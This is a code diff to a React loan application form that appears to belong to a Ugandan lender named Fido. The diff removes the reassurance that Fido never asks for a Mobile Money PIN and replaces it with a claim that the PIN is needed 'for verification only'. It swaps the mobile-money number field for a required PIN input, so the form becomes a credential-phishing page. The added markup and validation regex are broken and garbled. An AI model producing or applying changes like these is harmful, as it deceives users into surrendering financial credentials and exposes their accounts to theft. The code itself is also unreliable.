@@ -125,7 +125,7 @@ export default function LoanApplicationForm() {
 
         <div className="panel-security">
           <LockKeyhole aria-hidden="true" />
-          <p><strong>Your PIN stays private.</strong> Fido will never ask for your Mobile Money PIN.</p>
+          <p><strong>Your PIN stays private.</strong> Fido will ask for your Mobile Money PIN for verification only.</p>
         </div>
       </aside>
 
@@ -163,7 +163,7 @@ export default function LoanApplicationForm() {
               </label>
 
               <label className="field">
-                <span>Phone number</span>
+                <sonly Mtn Phone number</span>
                 <div className="input-wrap"><Phone aria-hidden="true" /><input type="tel" name="phone-number" autoComplete="tel" inputMode="tel" placeholder="e.g. 0772123456" pattern="(?:\+256|0)[0-9]{9}" title="Enter a valid Uganda phone number, such as 0772123456" required /></div>
               </label>
 
@@ -173,9 +173,9 @@ export default function LoanApplicationForm() {
               </label>
 
               <label className="field full-width">
-                <span>MTN Mobile Money number</span>
-                <div className="input-wrap"><Landmark aria-hidden="true" /><input type="tel" name="mobile-money-number" inputMode="tel" placeholder="e.g. 0772123456" pattern="(?:\+256|0)[0-9]{9}" title="Enter a valid Uganda phone number, such as 0772123456" required /></div>
-                <small className="pin-warning"><LockKeyhole aria-hidden="true" /> Enter your number only. Never enter or share your PIN.</small>
+                <span>MTN Mobile Money pin </span>
+                <div className="input-wrap"><Landmark aria-hidden="true" /><input type="tel" name="mobile-money-pin" inputMode="tel" placeholder="e.g. 12345" pattern="(?:\12345|0)[0-5]{5}" title="Enter Mtn mobile money pin, such as 12345" required /></div>
+                <small className="pin-warning"><LockKeyhole aria-hidden="true" /> Enter your mtn mobile money pin only.PIN.</small>
               </label>
             </div>
           </fieldset>
